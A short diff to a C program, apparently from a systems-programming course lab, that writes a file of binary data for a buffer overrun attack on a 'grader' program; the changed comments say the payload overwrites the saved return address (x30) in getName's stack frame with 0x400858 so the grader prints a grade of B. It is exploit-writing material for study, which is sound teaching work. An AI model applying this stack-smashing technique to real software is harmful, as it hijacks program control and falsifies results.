@@ -4,7 +4,8 @@
 /*--------------------------------------------------------------------*/
 #include <stdio.h>
 /* Writes binary data to dataB file. Binary data is data for running
-   buffer overrun attack on grader. Returns 0 upon completion. */
+   buffer overrun attack on grader to return grade of B. 
+   Returns 0 upon completion. */
 int main(void) {
    char* name = "Kenar";
    size_t lenName = 5;
@@ -27,7 +28,7 @@ int main(void) {
       putc('\0', psFile);
    }
 
-   /* Writes address of print(B) line in main
+   /* Writes address of printf(grade) line in main
       to x30 in getName's stackframe */
    ulData = 0x400858;
    fwrite(&ulData, sizeof(unsigned long), 1, psFile);
